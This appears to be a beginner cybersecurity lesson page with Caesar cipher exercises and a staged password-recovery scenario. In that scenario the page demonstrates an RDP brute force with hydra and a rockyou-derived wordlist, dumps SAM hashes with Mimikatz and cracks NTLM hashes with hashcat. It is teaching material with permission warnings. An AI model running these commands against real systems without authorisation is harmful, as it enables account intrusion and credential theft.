    Visit: [Online Cipher Wheel](https://computerscienced.co.uk/site/caesar-
    cipher-wheel/caesar-shift-encryption/)

    !!! warning "Your Tasks"

        1. Encrypt **"hello world"** with a shift of 5

        2. Decrypt **"xlrtn dsza"** and figure out the shift amount

        3. Encrypt a unique message, and give it to someone to decrypt. Don't 
        tell them the shift amount

    Is this type of encryption secure?

??? info "Keyed Encryption"

    **Types**

    **Symmetric Key**
        - Keyed Rotation Cipher 
        - DES
        - AES

    **Asymmetric Key**
        - Diffie Helman
        - RSA

    Pros and cons for each?

## 💪 RDP Brute Force and Mimikatz Demo

!!! abstract "Jerry's Issue"

    Jerry is a Spongebob Squarepants superfan - some might call him obsessed

    ![Spongebob](assets/spongebob.jpg){ align = right } 

    On a rarely used computer he shares with his family, he has a lot of
    nostalgiac, Spongebob memories on there. The issue though is that he has 
    forgotten his password :(

    He has called Lazer Cyber Consulting to help him crack his password to get
    back into his account

    How could we help get his data back?

??? success "What is the first question we should ask about Jerry's password?"

    **Do you remember any words in the password?**

    We can narrow down our search list with known key words.

!!! example "What are some potential guesses for the password?"

!!! bug "The Attack"

    Our target computer IP address is: **10.37.129.3**

    Jerry has already let us know that **Remote Desktop Protocol** has been 
    enabled on his computer
    
    === "Prepare The Wordlist"

        **We want to isolate potential passwords** 

        ```
        # Get words from rockyou.txt and put them in sponge.txt
        grep spongebob /usr/share/wordlists/rockyou.txt/ > sponge.txt
        ```

    === "Launch the Hydra Attack"

        ```
        hydra -t 2 -V -l Jerry -P sponge.txt rdp://10.37.129.3
        ```
        
        -t 2 -> Run 2 connections at once

        -V -> verbose mode (show the login attempt for each one)

        -l Jerry -> login with username "Jerry"

        -P sponge.txt -> try passwords from sponge.txt

!!! abstract "Monika's Issue"    

    We have learned that Jerry's sister Monika would also like to access her
    account on the computer - but she has also forgotten her password. The main
    issue however is that she has no clue what her password would be.

!!! success "What To Do"

    We were given permission to run a malicious program from Jerry's administrator
    account in order to obtain the password hash for Monika. 

!!! warning "This Is Dangerous"

    We have had to disable all Windows Antivirus protection to run the program.

    Do not disable any Windows Defender Antivirus protections on your own
    computer unless you know what you are doing. Furthermore do not use this
    program on any computer that you do not have permission to do it on.

!!! bug "Mimikatz Attack"

    === "Launching Mimikatz"

        We installed the program Mimikatz on Jerry's admin account.

        ```./mimikatz.exe```

    === "Obtaining The Hashes"

        ```
        token::elevate
        lsadump::sam
        ```

    === "Cracking The Hashes"

        Using `hashcat` we can try breaking the NTLM hashes.

        ```
        hashcat -m 1000 <hashlist> <rockyou> -O
        ```

## ✋Password Security

!!! success "Good Password Habits"

    - Use a password manager
    - Use long, randomly generated passwords with symbols, letters, and numbers
